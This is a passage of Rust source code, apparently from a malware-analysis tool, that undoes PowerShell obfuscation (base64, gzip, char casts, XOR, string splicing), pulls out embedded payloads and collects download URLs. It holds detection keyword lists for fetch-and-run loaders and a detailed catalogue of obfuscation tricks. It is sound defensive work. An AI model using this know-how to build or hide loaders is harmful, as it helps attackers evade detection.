        // Manual word boundary `(?:^|[^\w])` so `Foo` doesn't match inside
        // `MyFoo('xy')`. Carrier excludes `{` `}` to avoid greedily eating
        // body-literal braces from an unrelated PS function body.
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([^'"{{}}]{{6,8192}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = regex::Regex::new(&call_re_str) else {
            continue;
        };
        let call_matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|cc| {
                let full = cc.get(0)?;
                let carrier = cc.get(1)?.as_str();
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];
                let chars: Vec<char> = carrier.chars().collect();
                let mut decoded = String::new();
                let mut i = start;
                while i < chars.len() {
                    decoded.push(chars[i]);
                    i = i.checked_add(step).unwrap_or(chars.len());
                }
                if decoded.len() < 3 {
                    return None;
                }
                Some((
                    full.start(),
                    full.end(),
                    format!("{}'{}'", prefix, decoded.replace('\'', "")),
                ))
            })
            .collect();
        for (start_pos, end_pos, replacement) in call_matches.into_iter().rev() {
            out.replace_range(start_pos..end_pos, &replacement);
        }
    }

    out
}

// Matches `$NAME = @'\n...body...\n'@`. Captures: 1=var name, 2=body. The
// `'+` on each side accepts both the original form and the doubled-quote
// form that arises when the herestring is itself embedded inside a wrapping
// single-quoted PS literal (common after `[Convert]::FromBase64String('...')`
// inlining). The closing `'@` should be at column 0 in strict PS, but
// obfuscators often deviate, so we just require the marker pair.
#[allow(clippy::expect_used)]
static PS_HERESTRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)\$([A-Za-z_]\w*)\s*=\s*@'+\r?\n(.*?)\r?\n'+@"#).expect("ps herestring assign")
});

// `$DST = $SRC -replace 'NEEDLE', 'REPL'` — captures dst, src, needle, repl.
// PowerShell also accepts -ireplace/-creplace for explicit case behavior.
// Outer quote count is constrained to 1 or 2 so the matcher works both for
// the original form (`'a','b'`) and the doubled-quote form (`''a'','b''`)
// that arises when the chain is inlined inside a wrapping single-quoted PS
// literal. Inner pattern allows `''` as a single-quote escape but forbids
// `\n` so we never accidentally extend the match across a line.
#[allow(clippy::expect_used)]
static PS_VAR_REPLACE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\$([A-Za-z_]\w*)\s*=\s*\$([A-Za-z_]\w*)\s*-(?:[ic])?replace\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}\s*,\s*'{1,2}((?:[^'\\\n]|''|\\.)*?)'{1,2}"#,
    )
    .expect("ps var replace assign")
});

/// Pre-pass over a PowerShell text: expand common obfuscation patterns so that
/// subsequent URL-extraction regexes see literal strings.
fn expand_obfuscation(text: &str) -> String {
    let mut out = join_powershell_line_continuations(&normalize_powershell_quotes(text));
    for _ in 0..8 {
        let signals = PsObfuscationSignals::new(&out);
        if !signals.has_any_expansion_signal() {
            break;
        }
        let before = out.clone();
        if signals.argument_list {
            out = expand_start_process_argument_list(&out);
        }
        if signals.invoke_wrapper {
            out = expand_invoke_expression_wrappers(&out);
        }
        if signals.dot_replace {
            out = expand_ps_dot_replace(&out);
        }
        if signals.substring {
            out = expand_ps_dot_substring(&out);
        }
        if signals.embedded_single_quote_assignment {
            out = expand_ps_embedded_single_quote_assignments(&out);
        }
        if signals.doubled_single_quote {
            out = expand_doubled_quote_literals(&out);
        }
        if signals.skip_nth {
            out = expand_skip_nth(&out); // skip-nth-char decoder (Pattern B)
            out = expand_skip_nth_for_substring(&out);
        }
        if signals.char_cast {
            out = expand_char_concat(&out);
            out = expand_char_literal_concat(&out);
            out = expand_string_join_char_arrays(&out);
            out = expand_unary_join_char_arrays(&out);
            out = expand_char_array_concat_chunks(&out);
            out = expand_char_array_chunks(&out); // char-array chunk decoder (Pattern D)
        }
        if signals.hex_split {
            out = expand_hex_split_char_loop(&out);
        }
        if signals.space_concat {
            out = expand_space_concat(&out); // space-separated string array (Pattern C)
        }
        if signals.single_quote_concat {
            out = expand_string_concat(&out);
        }
        if signals.double_quote_concat {
            out = expand_double_string_concat(&out);
        }
        if signals.format {
            out = expand_format_literals(&out);
            out = expand_ps_string_format_static(&out);
        }
        if signals.compressed_base64 {
            out = expand_gzip_function_base64_variables(&out);
            out = expand_gzip_base64_literals(&out);
        }
        if signals.json_script_base64 {
            out = expand_json_script_base64(&out);
        }
        if signals.regex_replace_base64 {
            out = expand_regex_replace_base64_variables(&out);
        }
        if signals.regex_replace {
            out = expand_regex_replace_calls(&out);
        }
        if signals.base64_or_getstring {
            out = expand_getstring_base64_literals(&out);
            out = expand_getstring_base64_variables(&out);
            out = expand_getstring_byte_arrays(&out);
            out = expand_convert_frombase64_literals(&out);
            out = append_decoded_frombase64_literals(&out);
            out = expand_base64_literals(&out);
            out = expand_getstring_wrapper(&out);
        }
        if signals.reverse_slice_join {
            out = expand_reverse_string_slice_join(&out);
        }
        if signals.join {
            out = expand_single_literal_join(&out);
            out = expand_split_join_literals(&out);
            out = expand_ps_join(&out);
        }
        if signals.to_char_array {
            out = expand_tochararray_reverse_join(&out);
        }
        if signals.string_join {
            out = expand_ps_string_join(&out);
        }
        if signals.string_concat {
            out = expand_ps_string_concat_static(&out);
        }
        if signals.replace {
            out = expand_ps_replace(&out);
        }
        if signals.dot_replace {
            out = expand_ps_dot_replace(&out);
        }
        if signals.substring {
            out = expand_ps_dot_substring(&out);
        }
        let variables_changed = if signals.variables {
            let before_variables = out.clone();
            out = expand_ps_index_concat_assignments(&out);
            out = expand_ps_variables(&out);
            out != before_variables
        } else {
            false
        };
        if variables_changed {
            if signals.regex_replace {
                out = expand_regex_replace_calls(&out);
            }
            if signals.compressed_base64 {
                out = expand_gzip_function_base64_variables(&out);
            }
            if signals.char_cast {
                out = expand_string_join_char_arrays(&out);
                out = expand_unary_join_char_arrays(&out);
            }
            if signals.base64_or_getstring {
                out = expand_getstring_base64_literals(&out);
                out = expand_getstring_base64_variables(&out);
                out = expand_getstring_byte_arrays(&out);
                out = expand_convert_frombase64_literals(&out);
                out = append_decoded_frombase64_literals(&out);
                out = expand_base64_literals(&out);
                out = expand_getstring_wrapper(&out);
            }
        }
        if out == before {
            break;
        }
    }
    out
}

struct PsObfuscationSignals {
    argument_list: bool,
    invoke_wrapper: bool,
    dot_replace: bool,
    substring: bool,
    embedded_single_quote_assignment: bool,
    doubled_single_quote: bool,
    skip_nth: bool,
    char_cast: bool,
    hex_split: bool,
    space_concat: bool,
    single_quote_concat: bool,
    double_quote_concat: bool,
    format: bool,
    compressed_base64: bool,
    json_script_base64: bool,
    regex_replace_base64: bool,
    regex_replace: bool,
    base64_or_getstring: bool,
    reverse_slice_join: bool,
    join: bool,
    to_char_array: bool,
    string_join: bool,
    string_concat: bool,
    replace: bool,
    variables: bool,
}

impl PsObfuscationSignals {
    fn new(text: &str) -> Self {
        let lower = text.to_ascii_lowercase();
        let argument_list = lower.contains("-argumentlist");
        let has_function_def =
            lower.contains("function ") || lower.contains("-name ") || lower.contains("-n ");
        let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
        let dot_replace = lower.contains(".replace");
        let substring = lower.contains(".substring");
        let embedded_single_quote_assignment = text.contains("'''") && text.contains('$');
        let doubled_single_quote = text.contains("''");
        let skip_nth = has_function_def
            && (lower.contains("do")
                || lower.contains("for")
                || lower.contains("until")
                || lower.contains(".invoke"));
        let char_cast = lower.contains("[char");
        let hex_split = lower.contains("-split") && lower.contains("toint16");
        let space_concat = text.contains("' ") && (text.contains(" '") || text.contains("\t'"));
        let single_quote_concat = text.contains('\'') && text.contains('+');
        let double_quote_concat = text.contains('"') && text.contains('+');
        let format = lower.contains("-f") || lower.contains("string]::format");
        let compressed_base64 = (lower.contains("gzipstream") || lower.contains("deflatestream"))
            && lower.contains("base64");
        let json_script_base64 = lower.contains("convertfrom-json")
            && lower.contains("script")
            && lower.contains("frombase64string");
        let regex_replace = lower.contains("[regex]::replace");
        let regex_replace_base64 = regex_replace && lower.contains("frombase64string");
        let base64_or_getstring = lower.contains("base64")
            || lower.contains("frombase64string")
            || lower.contains(".getstring");
        let reverse_slice_join = lower.contains("-join") && lower.contains("-1..-");
        let join = lower.contains("-join")
            || lower.contains("-split")
            || lower.contains("-isplit")
            || lower.contains("-csplit");
        let to_char_array = lower.contains("tochararray") && lower.contains("reverse");
        let string_join = lower.contains("string]::join");
        let string_concat = lower.contains("string]::concat");
        let replace = lower.contains("replace");
        let variables = text.contains('$');

        Self {
            argument_list,
            invoke_wrapper,
            dot_replace,
            substring,
            embedded_single_quote_assignment,
            doubled_single_quote,
            skip_nth,
            char_cast,
            hex_split,
            space_concat,
            single_quote_concat,
            double_quote_concat,
            format,
            compressed_base64,
            json_script_base64,
            regex_replace_base64,
            regex_replace,
            base64_or_getstring,
            reverse_slice_join,
            join,
            to_char_array,
            string_join,
            string_concat,
            replace,
            variables,
        }
    }

    fn has_any_expansion_signal(&self) -> bool {
        self.argument_list
            || self.invoke_wrapper
            || self.dot_replace
            || self.substring
            || self.embedded_single_quote_assignment
            || self.doubled_single_quote
            || self.skip_nth
            || self.char_cast
            || self.hex_split
            || self.space_concat
            || self.single_quote_concat
            || self.double_quote_concat
            || self.format
            || self.compressed_base64
            || self.json_script_base64
            || self.regex_replace_base64
            || self.regex_replace
            || self.base64_or_getstring
            || self.reverse_slice_join
            || self.join
            || self.to_char_array
            || self.string_join
            || self.string_concat
            || self.replace
            || self.variables
    }
}

fn join_powershell_line_continuations(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for chunk in text.split_inclusive('\n') {
        let (line, had_newline) = match chunk.strip_suffix('\n') {
            Some(line) => (line.strip_suffix('\r').unwrap_or(line), true),
            None => (chunk, false),
        };
        let continuation_end = line.trim_end_matches([' ', '\t']);
        if let Some(prefix) = continuation_end.strip_suffix('`') {
            out.push_str(prefix);
            continue;
        }
        out.push_str(line);
        if had_newline {
            out.push('\n');
        }
    }
    out
}

fn normalize_powershell_quotes(text: &str) -> String {
    if !text
        .chars()
        .any(|c| matches!(c, '\u{2018}' | '\u{2019}' | '\u{201C}' | '\u{201D}'))
        && !text.contains("\\\"")
    {
        return text.to_string();
    }
    let normalized: String = text
        .chars()
        .map(|c| match c {
            '\u{2018}' | '\u{2019}' => '\'',
            '\u{201C}' | '\u{201D}' => '"',
            _ => c,
        })
        .collect();
    normalized.replace("\\\"", "\"")
}

fn strip_marker_noise(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for chunk in text.split_inclusive('\n') {
        let (line, newline) = match chunk.strip_suffix('\n') {
            Some(line) => (line, "\n"),
            None => (chunk, ""),
        };
        if should_skip_marker_noise_line(line) {
            out.push_str(line);
        } else {
            out.push_str(&strip_marker_noise_preserving_base64(line));
        }
        out.push_str(newline);
    }
    out
}

fn should_skip_marker_noise_line(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains(".replace(")
        || lower.contains("::replace(")
        || lower.contains("-replace")
        || lower.contains("-ireplace")
        || lower.contains("-creplace")
        || (lower.contains("-split") && lower.contains("-join"))
        || (lower.contains("-isplit") && lower.contains("-join"))
        || (lower.contains("-csplit") && lower.contains("-join"))
        || lower.contains("gzipstream")
        || lower.contains("readtoend")
        || lower.contains("function ")
        || lower.contains("for(")
}

fn strip_marker_noise_preserving_base64(text: &str) -> String {
    let spans = crate::marker_noise::decodable_base64_spans(text);
    if spans.is_empty() {
        return crate::marker_noise::strip_line(text);
    }

    let mut out = String::with_capacity(text.len());
    let mut cursor = 0usize;
    for (start, end) in spans {
        if start > cursor {
            out.push_str(&crate::marker_noise::strip_line(&text[cursor..start]));
        }
        out.push_str(&text[start..end]);
        cursor = end;
    }
    if cursor < text.len() {
        out.push_str(&crate::marker_noise::strip_line(&text[cursor..]));
    }
    out
}

/// Decode a ps1 payload to a String, handling UTF-16LE (from -EncodedCommand).
///
/// Heuristic: if at least half the even-offset bytes are non-zero and at
/// least half the odd-offset bytes are zero, treat as UTF-16LE.
fn decode_payload(bytes: &[u8]) -> std::borrow::Cow<'_, str> {
    if bytes.len() >= 4 && is_utf16le(bytes) {
        let u16s: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
            .collect();
        String::from_utf16_lossy(&u16s).into()
    } else {
        String::from_utf8_lossy(bytes)
    }
}

pub fn normalize_ps1_text(text: &str) -> String {
    let expanded = strip_marker_noise(&expand_obfuscation(&strip_marker_noise(text)));
    normalize_expanded_ps1_text(&expanded)
}

fn normalize_expanded_ps1_text(expanded: &str) -> String {
    let expanded = strip_marker_noise(expanded);
    let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
    let summarized = summarize_large_binary_ps_literals(&aliased);
    escape_binary_controls(&summarized)
}

pub fn normalize_ps1_payload(bytes: &[u8]) -> String {
    let raw_text = decode_payload(bytes);
    normalize_ps1_text(&raw_text)
}

fn escape_binary_controls(text: &str) -> String {
    if !text
        .chars()
        .any(|c| c.is_control() && !matches!(c, '\r' | '\n' | '\t'))
    {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if c.is_control() && !matches!(c, '\r' | '\n' | '\t') {
            use std::fmt::Write as _;
            let _ = write!(out, "\\x{:02X}", c as u32);
        } else {
            out.push(c);
        }
    }
    out
}

fn summarize_large_binary_ps_literals(text: &str) -> String {
    const MIN_LITERAL_BYTES: usize = 4096;

    if !text.contains('\'') {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len().min(256 * 1024));
    let mut cursor = 0usize;
    while cursor < text.len() {
        let Some(open_rel) = text[cursor..].find('\'') else {
            out.push_str(&text[cursor..]);
            break;
        };
        let open = cursor + open_rel;
        out.push_str(&text[cursor..=open]);

        let mut idx = open + 1;
        let mut close = None;
        while idx < text.len() {
            let Some(rel) = text[idx..].find('\'') else {
                break;
            };
            let quote = idx + rel;
            if text[quote + 1..].starts_with('\'') {
                idx = quote + 2;
                continue;
            }
            close = Some(quote);
            break;
        }

        let Some(close) = close else {
            out.push_str(&text[open + 1..]);
            break;
        };

        let literal = &text[open + 1..close];
        if literal.len() >= MIN_LITERAL_BYTES && is_binary_looking_ps_literal(literal) {
            out.push_str(&format!(
                "::==== harrington: omitted {} binary-looking bytes from PowerShell string literal ====",
                literal.len()
            ));
        } else {
            out.push_str(literal);
        }
        out.push('\'');
        cursor = close + 1;
    }

    out
}

fn is_binary_looking_ps_literal(literal: &str) -> bool {
    let mut suspicious = 0usize;
    let mut total = 0usize;
    for c in literal.chars() {
        total += 1;
        if c == '\u{fffd}'
            || (c.is_control() && !matches!(c, '\r' | '\n' | '\t'))
            || (!c.is_ascii() && !c.is_alphabetic())
        {
            suspicious += 1;
        }
    }
    total >= 1024 && suspicious * 100 >= total * 20
}

pub fn extract_self_embedded_ps1(env: &mut Environment, deobfuscated: &str) {
    let Some(input_bytes) = env.input_bytes.clone() else {
        return;
    };
    extract_sorted_comment_ps1(env, &input_bytes);

    let source = String::from_utf8_lossy(&input_bytes);
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    if looks_like_self_tail_base64_loader(deobfuscated) {
        for decoded in decode_large_base64_runs_from_source(&source) {
            if known.insert(decoded.clone()) {
                decoded_payloads.push(decoded);
            }
        }
    }

    if env.all_extracted_ps1.is_empty() && decoded_payloads.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();

    for payload in payloads {
        let text = decode_payload(&payload);
        if looks_like_self_tail_base64_loader(&text) {
            for decoded in decode_large_base64_runs_from_source(&source) {
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
        if !text.contains("%~f0") && !text.to_ascii_lowercase().contains("get-content") {
            continue;
        }
        for caps in SELF_B64_MATCH_RE.captures_iter(&text) {
            let Some(marker) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            for b64 in find_marker_base64_runs(&source, marker) {
                if b64.len() > 16 * 1024 * 1024 {
                    continue;
                }
                let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                    continue;
                };
                if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
                    continue;
                }
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
    }

    env.all_extracted_ps1.extend(decoded_payloads);
    extract_file_backed_xor_ps1(env, deobfuscated);
}

fn looks_like_self_tail_base64_loader(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("get-content") && lower.contains("-raw") && lower.contains("frombase64string")
}

fn decode_large_base64_runs_from_source(source: &str) -> Vec<Vec<u8>> {
    const MIN_B64_RUN: usize = 80;
    const MAX_B64_RUN: usize = 16 * 1024 * 1024;

    let bytes = source.as_bytes();
    let mut out = Vec::new();
    let mut start: Option<usize> = None;
    for (idx, &b) in bytes.iter().enumerate() {
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=') {
            start.get_or_insert(idx);
            continue;
        }
        if let Some(s) = start.take() {
            maybe_decode_source_b64_run(source, s, idx, MIN_B64_RUN, MAX_B64_RUN, &mut out);
        }
    }
    if let Some(s) = start {
        maybe_decode_source_b64_run(source, s, source.len(), MIN_B64_RUN, MAX_B64_RUN, &mut out);
    }
    out
}

fn maybe_decode_source_b64_run(
    source: &str,
    start: usize,
    end: usize,
    min_len: usize,
    max_len: usize,
    out: &mut Vec<Vec<u8>>,
) {
    let len = end.saturating_sub(start);
    if !(min_len..=max_len).contains(&len) {
        return;
    }
    let run = &source[start..end];
    let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(run) else {
        return;
    };
    if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
        return;
    }
    out.push(decoded);
}

fn extract_sorted_comment_ps1(env: &mut Environment, input_bytes: &[u8]) {
    let source = String::from_utf8_lossy(input_bytes);
    let lower = source.to_ascii_lowercase();
    if !lower.contains("sort-object")
        || !lower.contains("startswith(':: ")
        || !lower.contains("substring(0, 10)")
        || !lower.contains("substring(10)")
    {
        return;
    }

    let mut groups: std::collections::BTreeMap<String, Vec<(String, String)>> =
        std::collections::BTreeMap::new();
    for line in source.lines() {
        let Some(rest) = line.strip_prefix(":: ") else {
            continue;
        };
        if rest.len() < 12 {
            continue;
        }
        let (group, rest) = rest.split_at(2);
        let (order, chunk) = rest.split_at(10);
        if !group.bytes().all(|b| b.is_ascii_digit()) || !order.bytes().all(|b| b.is_ascii_digit())
        {
            continue;
        }
        groups
            .entry(group.to_string())
            .or_default()
            .push((order.to_string(), chunk.to_string()));
    }

    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    for (_group, mut chunks) in groups {
        chunks.sort_by(|a, b| a.0.cmp(&b.0));
        let joined: String = chunks.into_iter().map(|(_, chunk)| chunk).collect();
        if joined.len() > 8 * 1024 * 1024 {
            continue;
        }
        let payload = joined.replace("PATH", "%~f0").into_bytes();
        if !looks_like_powershell_payload(&payload) {
            continue;
        }
        if known.insert(payload.clone()) {
            env.all_extracted_ps1.push(payload);
        }
    }
}

fn extract_file_backed_xor_ps1(env: &mut Environment, deobfuscated: &str) {
    if env.all_extracted_ps1.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    for payload in payloads {
        let text = decode_payload(&payload);
        let lower = text.to_ascii_lowercase();
        if !lower.contains("frombase64string") || !lower.contains("-bxor") {
            continue;
        }

        for caps in FILE_B64_XOR_LOADER_RE.captures_iter(&text) {
            let Some(key_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(key) = caps.get(2).and_then(|m| m.as_str().parse::<u8>().ok()) else {
                continue;
            };
            let Some(data_var) = caps.get(3).map(|m| m.as_str()) else {
                continue;
            };
            let Some(path) = caps.get(4).map(|m| m.as_str()) else {
                continue;
            };
            let Some(from_b64_var) = caps.get(5).map(|m| m.as_str()) else {
                continue;
            };
            let Some(xor_key_var) = caps.get(6).map(|m| m.as_str()) else {
                continue;
            };
            if !data_var.eq_ignore_ascii_case(from_b64_var)
                || !key_var.eq_ignore_ascii_case(xor_key_var)
            {
                continue;
            }

            let Some(content) = filesystem_content_for_path(env, path)
                .or_else(|| grouped_echo_content_for_path(deobfuscated, path))
            else {
                continue;
            };
            if content.len() > 16 * 1024 * 1024 {
                continue;
            }
            let b64: String = content
                .iter()
                .copied()
                .filter(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
                .map(char::from)
                .collect();
            if b64.len() < 16 {
                continue;
            }
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                continue;
            };
            if decoded.len() > 12 * 1024 * 1024 {
                continue;
            }
            let xored: Vec<u8> = decoded.into_iter().map(|b| b ^ key).collect();
            if !looks_like_powershell_payload(&xored) {
                continue;
            }
            if known.insert(xored.clone()) {
                decoded_payloads.push(xored);
            }
        }
    }

    env.all_extracted_ps1.extend(decoded_payloads);
}

fn filesystem_content_for_path(env: &Environment, path: &str) -> Option<Vec<u8>> {
    let key = normalize_fs_lookup_path(path);
    env.modified_filesystem
        .iter()
        .find_map(|(candidate, entry)| {
            if normalize_fs_lookup_path(candidate) == key {
                fs_entry_content(entry)
            } else {
                None
            }
        })
}

fn grouped_echo_content_for_path(deobfuscated: &str, path: &str) -> Option<Vec<u8>> {
    let wanted = normalize_fs_lookup_path(path);
    let mut in_group = false;
    let mut chunks: Vec<String> = Vec::new();

    for line in deobfuscated.lines() {
        let trimmed = line.trim();
        if trimmed == "(" {
            in_group = true;
            chunks.clear();
            continue;
        }
        if !in_group {
            continue;
        }
        if let Some(target) = redirected_group_target(trimmed) {
            if normalize_fs_lookup_path(target) == wanted {
                let mut content = Vec::new();
                for chunk in chunks {
                    content.extend_from_slice(chunk.as_bytes());
                    content.extend_from_slice(b"\r\n");
                }
                return Some(content);
            }
            in_group = false;
            chunks.clear();
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix("echo ") {
            chunks.push(rest.to_string());
        }
    }

    None
}

fn redirected_group_target(line: &str) -> Option<&str> {
    let rest = line
        .strip_prefix(")>>")
        .or_else(|| line.strip_prefix(")>"))?
        .trim();
    rest.trim_matches('"').split_ascii_whitespace().next()
}

fn fs_entry_content(entry: &FsEntry) -> Option<Vec<u8>> {
    match entry {
        FsEntry::Content { content, .. } | FsEntry::Decoded { content, .. } => {
            Some(content.clone())
        }
        FsEntry::Download { .. } | FsEntry::Copy { .. } => None,
    }
}

fn normalize_fs_lookup_path(path: &str) -> String {
    let mut out = String::with_capacity(path.len());
    let mut last_was_backslash = false;
    for c in path.trim_matches('"').trim_matches('\'').chars() {
        let c = if c == '/' {
            '\\'
        } else {
            c.to_ascii_lowercase()
        };
        if c == '\\' {
            if !last_was_backslash {
                out.push(c);
            }
            last_was_backslash = true;
        } else {
            out.push(c);
            last_was_backslash = false;
        }
    }
    out
}

fn find_marker_base64_runs(source: &str, marker: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = source[search_from..].find(marker) {
        let start = search_from + rel + marker.len();
        let rest = &source[start..];
        let b64_len = rest
            .bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
            .count();
        if b64_len >= 32 {
            out.push(rest[..b64_len].to_string());
        }
        search_from = start.saturating_add(b64_len.max(1));
    }
    out
}

fn looks_like_powershell_payload(bytes: &[u8]) -> bool {
    let text = decode_payload(bytes);
    let lower = text.to_ascii_lowercase();
    lower.contains("invoke-")
        || lower.contains("new-object")
        || lower.contains("downloadstring")
        || lower.contains("downloadfile")
        || lower.contains("start-process")
        || lower.contains("powershell")
        || lower.contains("frombase64string")
        || lower.contains("iex ")
        || lower.contains("http://")
        || lower.contains("https://")
}

fn is_utf16le(bytes: &[u8]) -> bool {
    if bytes.len() < 4 {
        return false;
    }
    // Check BOM first
    if bytes[0] == 0xFF && bytes[1] == 0xFE {
        return true;
    }
    // Heuristic: odd-offset bytes are mostly zero (ASCII codepoints in UTF-16LE)
    let sample = &bytes[..bytes.len().min(256)];
    let pairs = sample.len() / 2;
    if pairs == 0 {
        return false;
    }
    let odd_zeros = sample.chunks_exact(2).filter(|b| b[1] == 0).count();
    odd_zeros * 2 >= pairs // >= 50% of odd bytes are zero
}

fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
    let mut foreach_urls: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();
    let mut array_bindings: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();

    for caps in PS_ARRAY_LITERAL_ASSIGN_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            array_bindings.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_LITERAL_ARRAY_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            foreach_urls.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_ARRAY_VAR_RE.captures_iter(text) {
        let (Some(item_var), Some(array_var)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(urls) = array_bindings.get(&array_var.as_str().to_ascii_lowercase()) else {
            continue;
        };
        foreach_urls.insert(item_var.as_str().to_ascii_lowercase(), urls.clone());
    }

    let mut seen = std::collections::HashSet::new();
    let mut urls = Vec::new();
    for caps in DYNAMIC_DOWNLOAD_INVOKE_RE.captures_iter(text) {
        if let Some(literal) = caps.get(2) {
            let Some(url) = crate::deob_scan::normalize_liberal_url_token(literal.as_str()) else {
                continue;
            };
            if seen.insert(url.clone()) {
                urls.push(url);
            }
            continue;
        }

        let Some(var) = caps.get(1) else {
            continue;
        };
        if let Some(values) = foreach_urls.get(&var.as_str().to_ascii_lowercase()) {
            for url in values {
                if seen.insert(url.clone()) {
                    urls.push(url.clone());
                }
            }
        }
    }
    urls
}

fn ps_downloadfile_calls(text: &str) -> Vec<(String, Option<String>)> {
    if !contains_ascii_case_insensitive_bytes(text, b"downloadfile") {
        return Vec::new();
    }

    let bindings = ps_string_bindings(text);
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for caps in DOWNLOADFILE_CALL_RE.captures_iter(text) {
        let Some(args) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let parts = split_ps_top_level_args(args);
        let Some(src_arg) = parts.first() else {
            continue;
        };
        let Some(url) = ps_url_arg(src_arg, &bindings) else {
            continue;
        };
        if !seen.insert(url.clone()) {
            continue;
        }
        let dst = parts.get(1).and_then(|arg| ps_string_arg(arg, &bindings));
        out.push((url, dst));
    }
    out
}

fn ps_url_arg(arg: &str, bindings: &std::collections::HashMap<String, String>) -> Option<String> {
    ps_string_arg(arg, bindings)
        .filter(|value| crate::deob_scan::looks_like_liberal_url(value))
        .and_then(|value| crate::deob_scan::normalize_liberal_url_token(&value))
}

fn ps_string_arg(
    arg: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    ps_literal_arg(arg).or_else(|| ps_variable_arg(arg, bindings))
}

fn ps_literal_arg(arg: &str) -> Option<String> {
    PS_QUOTED_LITERAL_RE.captures(arg).and_then(|literal_caps| {
        literal_caps
            .get(1)
            .or_else(|| literal_caps.get(2))
            .map(|m| m.as_str().replace("''", "'"))
    })
}

fn ps_variable_arg(
    arg: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let arg = arg.trim();
    let name = arg.strip_prefix('$')?;
    if !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
        return None;
    }
    bindings.get(&name.to_ascii_lowercase()).cloned()
}

fn split_ps_top_level_args(args: &str) -> Vec<&str> {
    let bytes = args.as_bytes();
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut depth = 0usize;
    let mut quote: Option<u8> = None;
    let mut i = 0usize;
    while i < bytes.len() {
        let byte = bytes[i];
        if let Some(q) = quote {
            if byte == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match byte {
            b'\'' | b'"' => quote = Some(byte),
            b'(' | b'[' | b'{' => depth += 1,
            b')' | b']' | b'}' => depth = depth.saturating_sub(1),
            b',' if depth == 0 => {
                parts.push(args[start..i].trim());
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    if start <= args.len() {
        parts.push(args[start..].trim());
    }
    parts
}

fn ps_literal_urls(text: &str) -> Vec<String> {
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| m.as_str().to_string())
        })
        .filter(|value| crate::deob_scan::looks_like_liberal_url(value))
        .filter_map(|value| crate::deob_scan::normalize_liberal_url_token(&value))
        .collect()
}

fn ps_literal_urls_in_download_context(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    if !lower.contains("download")
        && !lower.contains("invoke-webrequest")
        && !lower.contains("invoke-restmethod")
    {
        return Vec::new();
    }
    let mut seen = std::collections::HashSet::new();
    PS_QUOTED_LITERAL_RE
        .captures_iter(text)
        .filter_map(|literal_caps| {
            literal_caps
                .get(1)
                .or_else(|| literal_caps.get(2))
                .map(|m| {
                    let value = m.as_str().to_string();
